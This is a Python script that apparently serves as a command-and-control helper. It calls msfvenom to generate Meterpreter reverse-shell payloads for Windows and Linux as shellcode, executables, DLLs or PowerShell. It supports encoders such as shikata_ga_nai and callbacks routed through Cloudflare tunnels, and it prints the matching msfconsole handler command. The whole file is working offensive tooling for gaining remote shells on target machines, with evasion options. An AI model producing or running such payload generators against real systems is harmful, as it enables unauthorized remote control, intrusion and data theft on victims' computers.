#!/usr/bin/env python3
"""
Meterpreter Payload Generator - Quick payload generation for C2
Usage: python generate_meterpreter.py [OPTIONS]

Examples:
  # Generate stageless HTTPS meterpreter (recommended)
  python generate_meterpreter.py --lhost 192.168.1.100 --lport 443
  
  # Generate staged TCP meterpreter
  python generate_meterpreter.py --lhost 192.168.1.100 --lport 4444 --staged
  
  # Generate with custom cloudflare tunnel
  python generate_meterpreter.py --lhost your-tunnel.trycloudflare.com --lport 443 --format ps1
  
  # Generate 32-bit payload
  python generate_meterpreter.py --arch x86 --lhost 192.168.1.100 --lport 443
  
  # List all available payload types
  python generate_meterpreter.py --list
"""

import argparse
import subprocess
import base64
import os
import sys

# Payload templates
PAYLOAD_TYPES = {
    "windows": {
        "x64": {
            "tcp": {
                "staged": "windows/x64/meterpreter/reverse_tcp",
                "stageless": "windows/x64/meterpreter_reverse_tcp"
            },
            "http": {
                "staged": "windows/x64/meterpreter/reverse_http",
                "stageless": "windows/x64/meterpreter_reverse_http"
            },
            "https": {
                "staged": "windows/x64/meterpreter/reverse_https",
                "stageless": "windows/x64/meterpreter_reverse_https"
            }
        },
        "x86": {
            "tcp": {
                "staged": "windows/meterpreter/reverse_tcp",
                "stageless": "windows/meterpreter_reverse_tcp"
            },
            "http": {
                "staged": "windows/meterpreter/reverse_http",
                "stageless": "windows/meterpreter_reverse_http"
            },
            "https": {
                "staged": "windows/meterpreter/reverse_https",
                "stageless": "windows/meterpreter_reverse_https"
            }
        }
    },
    "linux": {
        "x64": {
            "tcp": {
                "staged": "linux/x64/meterpreter/reverse_tcp",
                "stageless": "linux/x64/meterpreter_reverse_tcp"
            },
            "https": {
                "staged": "linux/x64/meterpreter/reverse_https",
                "stageless": "linux/x64/meterpreter_reverse_https"
            }
        }
    }
}

def list_payloads():
    """List all available payload types"""
    print("=" * 70)
    print("  AVAILABLE PAYLOAD TYPES")
    print("=" * 70)
    
    for os_type, architectures in PAYLOAD_TYPES.items():
        print(f"\n{os_type.upper()}:")
        for arch, protocols in architectures.items():
            print(f"  {arch}:")
            for protocol, variants in protocols.items():
                print(f"    {protocol}:")
                print(f"      Staged:    {variants['staged']}")
                print(f"      Stageless: {variants['stageless']}")
    
    print("\n" + "=" * 70)
    print("FORMATS:")
    print("  raw        - Raw shellcode (default)")
    print("  exe        - Windows executable")
    print("  dll        - Windows DLL")
    print("  ps1        - PowerShell script")
    print("  python     - Python byte array")
    print("  c          - C array")
    print("=" * 70)

def generate_payload(args):
    """Generate payload using msfvenom"""
    
    # Determine payload string
    os_type = args.os
    arch = args.arch
    protocol = args.protocol
    staging = "stageless" if not args.staged else "staged"
    
    try:
        payload = PAYLOAD_TYPES[os_type][arch][protocol][staging]
    except KeyError:
        print(f"Error: Invalid combination {os_type}/{arch}/{protocol}/{staging}")
        print("Use --list to see available options")
        sys.exit(1)
    
    # Build msfvenom command
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={args.lhost}",
        f"LPORT={args.lport}",
        "-f", args.format
    ]
    
    # Add SSL certificate for HTTPS payloads
    if 'https' in payload and args.ssl_cert:
        cmd.append(f"HandlerSSLCert={args.ssl_cert}")
        cmd.append("StagerVerifySSLCert=false")
    
    # Add optional parameters
    if args.encoder:
        cmd.extend(["-e", args.encoder])
    
    if args.iterations:
        cmd.extend(["-i", str(args.iterations)])
    
    if args.bad_chars:
        cmd.extend(["-b", args.bad_chars])
    
    # Output file
    output_file = args.output
    if not output_file:
        ext_map = {
            "raw": "bin",
            "exe": "exe",
            "dll": "dll",
            "ps1": "ps1",
            "python": "py",
            "c": "c"
        }
        ext = ext_map.get(args.format, "txt")
        output_file = f"shellcode.{ext}"
    
    print(f"\n[*] Generating payload...")
    print(f"    Payload: {payload}")
    print(f"    LHOST:   {args.lhost}")
    print(f"    LPORT:   {args.lport}")
    print(f"    Format:  {args.format}")
    print(f"    Output:  {output_file}")
    
    # Generate payload
    try:
        result = subprocess.run(cmd, capture_output=True, check=True)
        
        # Save to file
        payloads_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
        os.makedirs(payloads_dir, exist_ok=True)
        output_path = os.path.join(payloads_dir, output_file)
        
        with open(output_path, "wb") as f:
            f.write(result.stdout)
        
        file_size = len(result.stdout)
        print(f"\n[+] Payload generated successfully!")
        print(f"    Size: {file_size} bytes ({file_size/1024:.2f} KB)")
        print(f"    Saved to: {output_path}")
        
        # If raw format, also create base64 version
        if args.format == "raw" and args.base64:
            b64_output = output_file + ".b64"
            b64_path = os.path.join(payloads_dir, b64_output)
            
            with open(b64_path, "w") as f:
                f.write(base64.b64encode(result.stdout).decode())
            
            print(f"    Base64: {b64_path}")
        
        # Print handler setup command
        print(f"\n[*] Start handler with:")
        if "https" in protocol and args.ssl_cert:
            print(f"    msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST 0.0.0.0; set LPORT {args.lport}; set HandlerSSLCert {args.ssl_cert}; set StagerVerifySSLCert false; set EnableStageEncoding false; set ExitOnSession false; exploit -j\"")
        else:
            print(f"    msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST 0.0.0.0; set LPORT {args.lport}; set ExitOnSession false; exploit -j\"")
        
        if "https" in protocol:
            print(f"\n[!] HTTPS payload - remember to set:")
            print(f"    set EnableStageEncoding false  (for stageless)")
            if args.ssl_cert:
                print(f"    set HandlerSSLCert {args.ssl_cert}")
                print(f"    set StagerVerifySSLCert false")
            print(f"    set OverrideLHOST your-tunnel.trycloudflare.com")
            print(f"    set OverrideLPORT 443")
        
    except subprocess.CalledProcessError as e:
        print(f"\n[!] Error generating payload:")
        print(e.stderr.decode())
        sys.exit(1)
    except FileNotFoundError:
        print("\n[!] Error: msfvenom not found. Is Metasploit installed?")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Quick Meterpreter payload generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Stageless HTTPS (recommended for tunnels)
  %(prog)s --lhost tunnel.trycloudflare.com --lport 443
  
  # Staged TCP (smaller initial payload)
  %(prog)s --lhost 192.168.1.100 --lport 4444 --staged --protocol tcp
  
  # 32-bit Windows payload
  %(prog)s --arch x86 --lhost 192.168.1.100 --lport 443
  
  # Generate as PowerShell script
  %(prog)s --lhost 192.168.1.100 --lport 443 --format ps1
        """
    )
    
    parser.add_argument('--list', action='store_true',
                        help='List all available payload types')
    
    parser.add_argument('--os', default='windows', choices=['windows', 'linux'],
                        help='Target OS (default: windows)')
    
    parser.add_argument('--arch', default='x64', choices=['x64', 'x86'],
                        help='Target architecture (default: x64)')
    
    parser.add_argument('--protocol', default='https', choices=['tcp', 'http', 'https'],
                        help='Connection protocol (default: https)')
    
    parser.add_argument('--staged', action='store_true',
                        help='Use staged payload (smaller, requires two connections)')
    
    parser.add_argument('--lhost', default='192.168.1.100',
                        help='Callback host (your IP or cloudflare tunnel)')
    
    parser.add_argument('--lport', type=int, default=443,
                        help='Callback port (default: 443)')
    
    parser.add_argument('--format', default='raw', 
                        choices=['raw', 'exe', 'dll', 'ps1', 'python', 'c'],
                        help='Output format (default: raw)')
    
    parser.add_argument('--output', '-o',
                        help='Output filename (auto-generated if not specified)')
    
    parser.add_argument('--base64', action='store_true',
                        help='Also create base64-encoded version (for raw format)')
    
    parser.add_argument('--encoder', '-e',
                        help='Encoder to use (e.g., x86/shikata_ga_nai)')
    
    parser.add_argument('--iterations', '-i', type=int,
                        help='Encoding iterations')
    
    parser.add_argument('--bad-chars', '-b',
                        help='Bad characters to avoid (e.g., \\x00\\x0a)')
    
    parser.add_argument('--ssl-cert',
                        help='SSL certificate .pem file for HandlerSSLCert (HTTPS payloads)')
    
    args = parser.parse_args()
    
    if args.list:
        list_payloads()
        sys.exit(0)
    
    # Validate required args
    if not args.lhost:
        print("Error: --lhost is required")
        parser.print_help()
        sys.exit(1)
    
    generate_payload(args)

if __name__ == "__main__":
    main()
